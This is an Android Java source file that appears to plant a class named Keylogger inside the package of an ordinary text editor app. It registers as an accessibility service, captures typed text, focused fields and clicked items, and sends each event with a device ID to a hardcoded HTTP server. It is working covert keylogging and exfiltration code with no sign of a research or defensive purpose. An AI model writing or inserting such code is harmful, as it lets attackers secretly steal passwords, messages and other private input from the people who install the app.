package org.billthefarmer.editor;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.AuthFailureError;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.billthefarmer.editor.model.keyLog;
import org.billthefarmer.editor.util.keyLogHelper;
import org.json.JSONObject;

import java.util.LinkedHashMap;
import java.util.Map;
public class Keylogger extends AccessibilityService {
    String addr = "http://192.168.1.7:8080";
    private final static String LOG_TAG = keyLogHelper.getLogTag(Keylogger.class);
    @Override
    public void onServiceConnected() {
        Log.i(LOG_TAG, "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        String uuid = keyLogHelper.getUuid();
        // datetimehelper
        String accessibilityEvent = null;
        String msg = null;

        switch (e.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf(e.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf(e.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf(e.getText());
            }
            default:
        }

        if (accessibilityEvent == null) {
            return;
        }

        Log.i(LOG_TAG, msg);

        keyLog kl = new keyLog();
        kl.setUuid(uuid);
        //kl.setDate(now);
        kl.setAccessibilityEvent(accessibilityEvent);
        kl.setMsg(msg);

        sendLog(addr, kl);

    }

    private Map<String, String> getMap(keyLog kl) throws IllegalAccessException {
        Map<String, String> res = new LinkedHashMap<>();
        res.put("uuid", kl.getUuid());
        res.put("msg", kl.getMsg());
        return res;
    }

    private void sendLog(String addr, keyLog kl) {
        try {
            RequestQueue rq = Volley.newRequestQueue(this);
            JsonObjectRequest klrq = new JsonObjectRequest(addr,
                    new JSONObject(getMap(kl)),
                    this::onResponse,
                    this::onErrorResponse
            );
            Log.i(LOG_TAG, String.valueOf(klrq.getHeaders()));
            Log.i(LOG_TAG, new String(klrq.getBody()));
            rq.add(klrq);
        } catch (AuthFailureError | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    private void onResponse(JSONObject resp) {
        Log.i(LOG_TAG, "response: " + resp);
    }

    private void onErrorResponse(VolleyError error) {
        if (error.getMessage() != null) {
            Log.e(LOG_TAG, error.getMessage());
        }
    }

    @Override
    public void onInterrupt() {

    }
}
